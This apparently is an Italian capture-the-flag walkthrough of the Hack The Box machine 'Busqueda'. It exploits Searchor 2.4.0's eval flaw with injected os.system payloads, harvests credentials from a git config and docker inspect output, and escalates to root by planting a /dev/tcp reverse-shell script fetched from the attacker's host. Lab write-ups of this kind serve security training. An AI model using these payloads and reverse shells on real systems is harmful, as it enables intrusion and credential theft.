@@ -1,0 +1,102 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.11.208
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+10.10.11.208	[host]
+sudo echo "10.10.11.208  busqueda.htb" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.11.208 -w /usr/share/wordlists/dirb/common.txt
+
+---------------------------------------------------------------------------------------------------------------
+Andiamo a verificare cosa c'è nella porta 80.
+Visitiamo http://busqueda.htb e veniamo indirizzati verso http://searcher.htb -> Aggiungiamolo al file /etc/hosts
+
+Nel sito c'è un form. Iniziamo a fare qualche test per verificare se è attaccabile. Il sito è sviluppato con Searchor 2.4.0
+
+Se lo compiliamo riceviamo una risposta del genere -> https://www.accuweather.com/en/search-locations?query=test
+
+Se mettiamo questo come input -> ' OR 1=1 -> Non riceviamo nessuna risposta.
+
+Cerchiamo online qualcosa su Searchor 2.4.0. La versione 2.4.0 è affetta da vulnerabilità -> "Affected versions of this package are vulnerable to Arbitrary Code Execution due to unsafe implementation of eval method."
+
+Cerchiamo come poterla sfruttare... -> 
+
+Con questa stringa riusciamo ad ottenere quanto desiderato -> test' + __import__('os').system('pwd'))#
+' + __import__('os').system('pwd'))# -> svc
+' + __import__('os').system('ls /home/svc'))# -> script user.txt
+' + __import__('os').system('cat /home/svc/user.txt'))# -> d8296797916b283184c5a0048192ae95
+' + __import__('os').system('sudo -l'))# -> Non ricevo nessun output
+' + __import__('os').system('ls /home/svc/script'))# -> full-checkup.sh
+' + __import__('os').system('cat /home/svc/script/full-checkup.sh'))# -> Una backdoor, sicuramente inserita da qualcun'altro. Proviamo a caricare la nostra
+' + __import__('os').system('"#!/usr/bin/python3 import socket import subprocess import os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"10.10.16.32\",9001)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty pty.spawn(\"sh\")" > /home/svc/script/js.sh'))#
+' + __import__('os').system('./home/svc/script/js.sh'))#  -> Niente da fare
+
+' + __import__('os').system('ls /var/www'))# -> Andiamo nella cartella del sito, magari troviamo qualche configurazione interessante -> app html
+' + __import__('os').system('ls -la /var/www/app'))# -> Ci sono due cose potenzialmente interessanti, la cartella .git e un file .py
+' + __import__('os').system('cat /var/www/app/.git/config'))# -> [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote "origin"] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch "main"] remote = origin merge = refs/heads/main
+
+Provo a collegarmi con quelle credenziali -> ssh svc@busuqeda.htb jh1usoih2bkjaspwe92 -> Entrati
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Cerchiamo se l'utente è tra i sudoers
+sudo -l -> (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+
+Controlliamo subito cos'è questo file system-checkup.py
+
+sudo python3 /opt/scripts/system-checkup.py -h -> Scopriamo che è un qualcosa legato a docker
+
+sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db -> --format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
+
+Inseriamo un nuovo riferimento su /etc/hosts -> gitea.searcher.htb 
+Andiamo su gitea.searcher.htb -> Ci sono due utenti cody e administrator
+Facciamo il login.
+	administrator:jI86kGUuj87guWr3RyF -> NO
+	administrator:yuiu1hoiu4i5ho1uh  -> Entrato
+	cody:jh1usoih2bkjaspwe92 -> Entrato
+
+Una volta entrato come amministratore esploro la piattaforma. Trovo i file dentro la cartella scripts.
+
+Analizzando system-checkup.py, noto che lo eseguo con il comando full-checkup lui va a richiamare il file full-checkup.sh
+Questa è una cosa potenzialmente sfruttabile.
+
+Creo un file che mi possa dare accesso alla macchina, chiamato proprio full-checkup.sh
+#!/bin/bash
+sh -i 5<> /dev/tcp/[MY_IP]/[MY_PORT] 0<&5 1>&5 2>&5
+
+Lo carico sulla macchina 
+	sudo python -m http.server 9001
+	wget http://10.10.16.32:9001/full-checkup.sh
+	
+Ed eseguo 
+	nc -nlvp 9001 -> Sulla mia macchina
+	sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup -> Su busqueda
+	
+Sono dentro
+whoami -> root
+cat /root/root.txt -> 5d9b0b814600f94cb2c06fb697561eab
+
+
+
+
+
